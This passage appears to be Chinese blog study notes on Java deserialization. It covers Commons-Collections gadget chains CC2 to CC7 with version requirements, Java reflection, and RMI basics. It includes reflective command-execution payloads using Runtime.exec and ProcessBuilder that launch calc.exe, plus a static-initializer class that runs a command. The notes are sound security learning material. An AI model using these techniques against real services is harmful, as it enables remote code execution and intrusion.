commons-collections</span><br></pre></td></tr></table></figure>

<ul>
<li>CommonsCollections &lt;&#x3D; 3.2.1</li>
<li>java &lt; 8u71（我是用的是8u66）</li>
</ul>
<p>cc2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">	Gadget chain:</span><br><span class="line">		ObjectInputStream.readObject()</span><br><span class="line">			PriorityQueue.readObject()</span><br><span class="line">				...</span><br><span class="line">					TransformingComparator.compare()</span><br><span class="line">						InvokerTransformer.transform()</span><br><span class="line">							Method.invoke()</span><br><span class="line">								Runtime.exec()</span><br><span class="line"> */</span><br></pre></td></tr></table></figure>

<p>利用条件比较苛刻：首先 CommonsCollections3 中无法使用，因为其 TransformingComparator 无法序列化。其次只有 CommonsCollections4-4.0 可以使用，因为 CommonsCollections4 其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化。</p>
<p>cc3</p>
<p><strong>测试环境</strong>：3.1-3.2.1，jdk7u21及以前</p>
<p>cc4</p>
<p><strong>测试环境</strong>：4.0，jdk7u21及以前</p>
<p>cc5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">	Gadget chain:</span><br><span class="line">        ObjectInputStream.readObject()</span><br><span class="line">            BadAttributeValueExpException.readObject()</span><br><span class="line">                TiedMapEntry.toString()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br><span class="line"></span><br><span class="line">	Requires:</span><br><span class="line">		commons-collections</span><br><span class="line"> */</span><br><span class="line">/*</span><br><span class="line">This only works in JDK 8u76 and WITHOUT a security manager</span><br></pre></td></tr></table></figure>

<p><strong>测试环境</strong>：3.1-3.2.1，jdk1.8</p>
<p>cc6</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">	Gadget chain:</span><br><span class="line">	    java.io.ObjectInputStream.readObject()</span><br><span class="line">            java.util.HashSet.readObject()</span><br><span class="line">                java.util.HashMap.put()</span><br><span class="line">                java.util.HashMap.hash()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                        org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                            java.lang.reflect.Method.invoke()</span><br><span class="line">                                java.lang.Runtime.exec()</span><br><span class="line"></span><br><span class="line">    by @matthias_kaiser</span><br><span class="line">*/</span><br><span class="line">@SuppressWarnings(&#123;&quot;rawtypes&quot;, &quot;unchecked&quot;&#125;)</span><br><span class="line">@Dependencies(&#123;&quot;commons-collections:commons-collections:3.1&quot;&#125;)</span><br></pre></td></tr></table></figure>

<p><strong>测试环境</strong>：3.1-3.2.1，jdk1.7,1.8</p>
<p>cc7</p>
<p><strong>测试环境</strong>：3.1-3.2.1，jdk1.7,1.8</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">    Payload method chain:</span><br><span class="line"></span><br><span class="line">    java.util.Hashtable.readObject</span><br><span class="line">    java.util.Hashtable.reconstitutionPut</span><br><span class="line">    org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">    java.util.AbstractMap.equals</span><br><span class="line">    org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">    org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">    org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class="line">    java.lang.reflect.Method.invoke</span><br><span class="line">    sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class="line">    java.lang.Runtime.exec</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>



<h2 id="Java的动态特性——反射"><a href="#Java的动态特性——反射" class="headerlink" title="Java的动态特性——反射"></a>Java的动态特性——反射</h2><p>参考：</p>
<p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/422128255425528">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)</a></p>
<p><a href="https://wx.zsxq.com/dweb2/index/columns/2212251881">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)</a></p>
<p>反射是⼤多数语⾔⾥都必不可少的组成部分，对象可以通过反射获取他的类，类可以通过反射拿到所有 ⽅法（包括私有），拿到的⽅法可以调⽤，总之通过“反射”，我们可以将Java这种静态语⾔附加上动态 特性。</p>
<p>“动态特性”：⼀段代码，改变其中的变量，将会导致这段代码产⽣功能性的变化，称之为动态特性</p>
<p>下面是一段反射的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"> <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line"> clazz.getMethod(methodName).invoke(clazz.newInstance());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>⼏个在反射⾥极为重要的⽅法：</p>
<p> 获取类的⽅法： forName </p>
<p>实例化类对象的⽅法： newInstance </p>
<p>获取函数的⽅法： getMethod </p>
<p>执⾏函数的⽅法： invoke</p>
<p>forName 不是获取“类”的唯⼀途径，通常来说我们有如下三种⽅式获取⼀个“类”，也就 是 java.lang.Class 对象：</p>
<ol>
<li>obj.getClass() 如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过 obj.getClass() 来获取它的类 </li>
<li>Test.class 如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接 拿它的 class 属性即可。这个⽅法其实不属于反射。 </li>
<li>Class.forName 如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取</li>
</ol>
<p>使⽤反射的⼀⼤⽬的，就是绕过某些沙盒。⽐如，上下⽂中如果只有Integer类型的 数字，我们如何获取到可以执⾏命令的Runtime类呢？也许可以这样（伪代 码）： 1.getClass().forName(“java.lang.Runtime”)</p>
<p>forName有两个函数重载：</p>
<ul>
<li><p>Class forName(String name) </p>
</li>
<li><p>Class forName(String name, <strong>boolean</strong> initialize, ClassLoader loader)</p>
</li>
</ul>
<p>第⼀个就是我们最常⻅的获取class的⽅式，其实可以理解为第⼆种⽅式的⼀个封装：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(className)</span><br><span class="line"><span class="comment">// 等于</span></span><br><span class="line">Class.forName(className, <span class="literal">true</span>, currentLoader)</span><br></pre></td></tr></table></figure>

<p>默认情况下， forName 的第⼀个参数是类名；第⼆个参数表示是否初始化；第三个参数就 是 ClassLoader 。</p>
<p>ClassLoader 是什么呢？它就是⼀个“加载器”，告诉Java虚拟机如何加载这个类。</p>
<p>下面是一个类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainPrint</span> &#123;</span><br><span class="line"> &#123;</span><br><span class="line"> System.out.printf(<span class="string">&quot;Empty block initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">static</span> &#123;</span><br><span class="line"> System.out.printf(<span class="string">&quot;Static initial %s\n&quot;</span>, TrainPrint.class);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="title function_">TrainPrint</span><span class="params">()</span> &#123;</span><br><span class="line"> System.out.printf(<span class="string">&quot;Initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">Static initial <span class="keyword">class</span> <span class="title class_">org</span>.example.Main$TrainPrint</span><br><span class="line">Empty block initial <span class="keyword">class</span> <span class="title class_">org</span>.example.Main$TrainPrint</span><br><span class="line">Initial <span class="keyword">class</span> <span class="title class_">org</span>.example.Main$TrainPrint</span><br></pre></td></tr></table></figure>

<p>⾸先调⽤的是 static {} ，其次是 {} ，最后是构造函数。</p>
<p>其中， static {} 就是在“类初始化”的时候调⽤的，⽽ {} 中的代码会放在构造函数的 super() 后⾯， 但在当前构造函数内容的前⾯。</p>
<p>forName 中的 initialize&#x3D;true 其实就是告诉Java虚拟机是否执⾏”类初始化“。</p>
<p>假设我们有如下函数，其中函数的参数name可控：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ref</span><span class="params">(String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"> Class.forName(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们就可以编写⼀个恶意类，将恶意代码放置在 static {} 中，从⽽执⾏：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line"> <span class="keyword">static</span> &#123;</span><br><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line"> <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"> String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line"> <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line"> pc.waitFor();</span><br><span class="line"> &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"> <span class="comment">// do nothing</span></span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是自己写的demo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        excute(<span class="string">&quot;org.example.hello&quot;</span>,<span class="string">&quot;sayHello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">excute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        Class clazz=Class.forName(className);</span><br><span class="line">        clazz.getMethod(methodName).invoke(clazz.newInstance());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hello</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    hello()&#123;</span><br><span class="line">        name=<span class="string">&quot;xcc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在正常情况下，除了系统类，如果我们想拿到一个类，需要先 import 才能使用。而使用forName就不需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类。</p>
<p>另外，我们经常在一些源码里看到，类名的部分包含 $ 符号，比如<em>fastjson</em>在 checkAutoType 时候就会 先将$ 替换成 . ：<a href="https://github.com/alibaba/fastjson/blob/fcc9c2a/src/main/java/com/alibaba/fa">https://github.com/alibaba/fastjson/blob/fcc9c2a/src/main/java/com/alibaba/fa</a> stjson&#x2F;parser&#x2F;ParserConfig.java#L1038。 $ 的作用是查找内部类。</p>
<p>Java的普通类 C1 中支持编写内部类 C2 ，而在编译的时候，会生成两个文件： C1.class 和 C1$C2.class ，我们可以把他们看作两个无关的类，通过 Class.forName(“C1$C2”) 即可加载这个内 部类。</p>
<p><a href="https://www.jianshu.com/p/b10d006a14fd">Java 反射内部类 - 简书 (jianshu.com)</a></p>
<p>下面是自己写的demo：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        excute(<span class="string">&quot;org.example.test$hello&quot;</span>,<span class="string">&quot;sayHello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">excute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        Class clazz=Class.forName(className);</span><br><span class="line">        clazz.getMethod(methodName).invoke(clazz.newInstance());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">hello</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> String name;</span><br><span class="line">        hello()&#123;</span><br><span class="line">            name=<span class="string">&quot;xcc&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span>&#123;</span><br><span class="line">            System.out.println(name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>class.newInstance() 的作用就是调用这个类的无参构造函数，这个比较好理解。不过，我们有时候 在写漏洞利用方法的时候，会发现使用 newInstance 总是不成功，这时候原因可能是： </p>
<ol>
<li>你使用的类没有无参构造函数 </li>
<li>你使用的类构造函数是私有的</li>
</ol>
<p>最常见的情况就是 java.lang.Runtime ，这个类在我们构造命令执行Payload的时候很常见，但 我们不能直接这样来执行命令：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.newInstance(), <span class="string">&quot;id&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>原因是 Runtime 类的构造方法是私有的。</p>
<p>类的私有原因设计到一种设计模式“单例模式”。</p>
<p>比如，对于Web应用来说，数据库连接只需要建立一次，而不是每次用到数据库的时候再新建立一个连 接，此时作为开发者你就可以将数据库连接使用的类的构造函数设置为私有，然后编写一个静态方法来 获取：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainDB</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">TrainDB</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TrainDB</span>();</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> TrainDB <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> instance;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="title function_">TrainDB</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">// 建立连接的代码...</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样，只有类初始化的时候会执行一次构造函数，后面只能通过 getInstance 获取这个对象，避免建立多个数据库连接。</p>
<p>Runtime类就是单例模式，我们只能通过 Runtime.getRuntime() 来获取到 Runtime 对 象。我们将上述Payload进行修改即可正常执行命令了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz),</span><br><span class="line"><span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这里用到了 getMethod 和 invoke 方法。 getMethod 的作用是通过反射获取一个类的某个特定的公有方法。而学过Java的同学应该清楚，Java中 支持类的重载，我们不能仅通过函数名来确定一个函数。所以，在调用 getMethod 的时候，我们需要 传给他你需要获取的函数的参数类型列表。</p>
<p>Runtime.exec 方法有6个重载：</p>
<p>使用最简单的，也就是第一个，它只有一个参数，类型是String，所以我们使用 getMethod(“exec”, String.class) 来获取 Runtime.exec 方法。</p>
<p>invoke 的作用是执行方法，它的第一个参数是： </p>
<ul>
<li><p>如果这个方法是一个普通方法，那么第一个参数是类对象</p>
</li>
<li><p>如果这个方法是一个静态方法，那么第一个参数是类</p>
</li>
</ul>
<p>这也比较好理解了，我们正常执行方法是 [1].method([2], [3], [4]…) ，其实在反射里就是 method.invoke([1], [2], [3], [4]…) 。</p>
<p>将上述命令执行的Payload分解一下就是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethod.invoke(clazz);</span><br><span class="line">execMethod.invoke(runtime, <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>现在有两个问题：</p>
<ul>
<li><p>如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类 呢？ </p>
</li>
<li><p>如果一个方法或构造方法是私有方法，我们是否能执行它呢？</p>
</li>
</ul>
<p>下面在回答。</p>
<p><strong>第一个问题</strong>，我们需要用到一个新的反射方法 getConstructor 。</p>
<p> 和 getMethod 类似， getConstructor 接收的参数是构造函数列表类型，因为构造函数也支持重载， 所以必须用参数列表类型才能唯一确定一个构造函数。</p>
<p> 获取到构造函数后，我们使用 newInstance 来执行。</p>
<p> 比如，我们常用的另一种执行命令的方式ProcessBuilder，我们使用反射来获取其构造函数，然后调用 start() 来执行命令：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder)</span><br><span class="line">clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>))).start();</span><br></pre></td></tr></table></figure>

<p>ProcessBuilder有两个构造函数：</p>
<ul>
<li><p>public ProcessBuilder(List command) </p>
</li>
<li><p>public ProcessBuilder(String… command)</p>
</li>
</ul>
<p>我上面用到了第一个形式的构造函数，所以我在 getConstructor 的时候传入的是 List.class 。</p>
<p> 但是，我们看到，前面这个Payload用到了Java里的强制类型转换，有时候我们利用漏洞的时候（在表达式上下文中）是没有这种语法的。</p>
<p>所以，我们仍需利用反射来完成这一步。</p>
<p>代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure>

<p>通过 getMethod(“start”) 获取到start方法，然后 invoke 执行， invoke 的第一个参数就是ProcessBuilder Object了。</p>
<p><strong>第二个问题</strong></p>
<p>getDeclared 系列的反射了，与普通的 getMethod 、 getConstructor 区别是：</p>
<ul>
<li>getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法</li>
<li>getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私 有的方法，但从父类里继承来的就不包含了</li>
</ul>
<p>getDeclaredMethod 的具体用法和 getMethod 类似， getDeclaredConstructor 的具体用法和 getConstructor 类似。</p>
<p>过Runtime这个类的构造函数是私有的，我们需要用 Runtime.getRuntime() 来 获取对象。其实现在我们也可以直接用 getDeclaredConstructor 来获取这个私有的构造方法来实例 化对象，进而执行命令：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><a href="https://developer.aliyun.com/article/330847">反射setAccessible()方法-阿里云开发者社区 (aliyun.com)</a></p>
<h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p><a href="https://wx.zsxq.com/dweb2/index/columns/2212251881">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)</a></p>
<p>RMI全称是Remote Method Invocation，远程⽅法调⽤。从这个名字就可以看出，他的⽬标和RPC其实 是类似的，是让某个Java虚拟机上的对象调⽤另⼀个Java虚拟机中对象上的⽅法，只不过RMI是Java独 有的⼀种机制。</p>
<p>⼀个例⼦</p>
<p>RMI Server:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span></span><br><span class="line">            <span class="title class_">IRemoteHelloWorld</span> &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;call from&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Hello world&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>⼀个RMI Server分为三部分：</p>
<ul>
<li>⼀个继承了 java.rmi.Remote 的接⼝，其中定义我们要远程调⽤的函数，⽐如这⾥的 hello() </li>
<li>⼀个实现了此接⼝的类 </li>
<li>⼀个主类，⽤来创建Registry，并将上⾯的类实例化后绑定到⼀个地址。这就是我们所谓的Server 了</li>
</ul>
<p>RMI Client：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.example.RMIServer;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        RMIServer.<span class="type">IRemoteHelloWorld</span> <span class="variable">hello</span> <span class="operator">=</span> (RMIServer.IRemoteHelloWorld)</span><br><span class="line">                Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> hello.hello();</span><br><span class="line">        System.out.println( ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端就简单多了，使⽤ Naming.lookup 在Registry中寻找到名字是Hello的对象，后⾯的使⽤就和在 本地使⽤⼀样了。</p>
<p>虽说执⾏远程⽅法的时候代码是在远程服务器上执⾏的，但实际上我们还是需要知道有哪些⽅法，这时 候接⼝的重要性就体现了，这也是为什么我们前⾯要继承 Remote 并将我们需要调⽤的⽅法写在接⼝ IRemoteHelloWorld ⾥，因为客户端也需要⽤到这个接⼝。</p>
<p>流程：</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230321185000707.png" alt="image-20230321185000707"></p>
<p>RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name 到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI Server；最后，远程⽅法实际上在RMI Server上调⽤。</p>
<p><strong>利用codebase攻击RMI Registry。</strong><del>这部分云了</del></p>
<p><a href="https://wx.zsxq.com/dweb2/index/columns/2212251881">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)</a></p>
<p>一个RMI过程有以下三个参与者： RMI Registry 、RMI Server、 RMI Client</p>
<p>通常我们在新建一个RMI Registry的时候，都会 直接绑定一个对象在上面，也就是说我们示例代码中的Server其实包含了Registry和Server两部分：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>());</span><br></pre></td></tr></table></figure>

<p>第一行创建并运行RMI Registry，第二行将RemoteHelloWorld对象绑定到Hello这个名字上。 Naming.bind 的第一个参数是一个URL，形如： rmi:&#x2F;&#x2F;host:port&#x2F;name 。</p>
<p>其中，host和port就是 RMI Registry的地址和端口，name是远程对象的名字。</p>
